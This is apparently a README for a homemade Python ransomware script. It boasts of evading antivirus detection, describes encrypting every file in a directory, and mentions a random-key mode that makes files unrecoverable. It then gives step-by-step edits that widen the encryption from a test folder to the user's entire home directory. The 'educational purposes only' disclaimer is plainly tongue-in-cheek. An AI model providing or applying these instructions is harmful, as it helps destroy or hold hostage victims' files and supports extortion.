<h1>PLEASE DO NOT RUN ON YOUR SYSTEM</h1>
<h1>OR SYSTEMS THAT YOU ARE NOT ALLOWED TO RUN THIS ON</h1>
as usual
"For educational purposes only :)"

This is a very simple python code
100% undetectacble by an antivirus (check with virus total :-) )
I think it will be termed a ransomware lol

It encrypts all files given in a directory
you can decrypt it with d-dec.py

or you can make play.py encrypt files with random keys
NB: Files cannot be decrypted in this way 

you can modify the script to encrypt all files on the pc
you can read from the comments at the top of the play.py file or use this

at the top (Just to make code neat)
from os.path import expanduser
then:
home = expanduser("~")

so print(home) will be something like
on linux:
	"/root"
on windows:
	"/Users/MyUsername"

then look for this in play.py
for x in os.walk("/me/enc/mal/"):

replace this part of the code
("/me/enc/mal/")
replace with
(home)
so it should be 
for x in os.walk(home + "/"):

and you are done :)
